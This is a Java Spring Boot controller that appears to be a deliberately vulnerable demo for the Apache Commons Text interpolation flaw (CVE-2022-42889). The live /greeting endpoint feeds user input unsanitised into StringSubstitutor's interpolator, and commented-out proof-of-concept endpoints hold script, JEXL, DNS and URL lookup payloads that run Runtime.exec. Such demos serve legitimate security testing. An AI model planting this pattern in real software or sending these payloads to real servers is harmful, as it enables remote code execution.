package com.example.springboot;

import org.apache.commons.text.StringSubstitutor;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.ui.ModelMap;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;



@Controller
@RestController
public class VulnController {
    // @GetMapping("/poc1")
    // public String pocScript() {
    //     String script;
    //     if (getRunningJVMVersion() < 15) {
    //         script = "${java:version} - ${script:javascript:7*7} - ${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}";
    //     } else {
    //         script = "${java:version} - ${script:JEXL:7*7} - ${script:JEXL:''.getClass().forName('java.lang.Runtime').getRuntime().exec('touch /tmp/pwned')}";
    //     }
    //     return interpolate(script);
    // }

    // @GetMapping("/poc2")
    // public String pocDNS() {
    //     String dns = "${java:version} - ${dns:address|commons.apache.org}";
    //     return interpolate(dns);
    // }

    // @GetMapping("/poc3")
    // public String pocURL() {
    //     // String dns = "${java:version} - ${url:UTF-8:https://nvd.nist.gov/vuln/detail/CVE-2022-42889}";
    //     String dns = "${java:version} - ${url:UTF-8:https://google.com}";
    //     return interpolate(dns);
    // }

   @GetMapping("/greeting")
   // public String handleScript(@RequestParam(defaultValue = "You are running java.version ${java.version} and os.name = ${os.name}") String text) {
        public String greeting(@RequestParam(name="name", required=false, defaultValue="World") String name, Model model) {
        model.addAttribute("name", name);
        return interpolate("Hello " + name);
   }

    // private int getRunningJVMVersion() {
    //      System.out.println("Current JVM version - " + System.getProperty("java.version"));
    //      String[] versionElements = System.getProperty("java.version").split("\\.");
    //      int discard = Integer.parseInt(versionElements[0]);
    //      int version = (discard == 1) ? Integer.parseInt(versionElements[1]) : discard;
    //      return version;
    // }

    private String interpolate(String input) {
        final StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
        String out = interpolator.replace(input);
        System.out.println(out);
        // return out;
        return "greeting";
    }
}





